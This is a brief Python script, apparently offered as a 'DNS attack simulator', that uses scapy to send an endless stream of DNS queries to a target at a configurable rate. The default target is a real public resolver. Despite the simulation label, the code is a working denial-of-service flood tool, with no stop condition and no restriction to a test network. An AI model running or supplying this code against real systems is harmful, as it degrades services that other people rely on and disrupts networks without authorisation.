# dns_attack_simulator.py
from scapy.all import IP, UDP, DNS, DNSQR, send
import time

def dns_flood(target="8.8.8.8", domain="example.com", requests_per_second=1000):
    print(f"Simulating DNS flood to {target} for {domain} at {requests_per_second} requests per second...")
    packet = IP(dst=target) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    
    # Calculate the time interval between each request
    interval = 1.0 / requests_per_second

    while True:
        send(packet, verbose=False)  # Send the packet without verbose output
        time.sleep(interval)  # Wait for the interval before sending the next packet
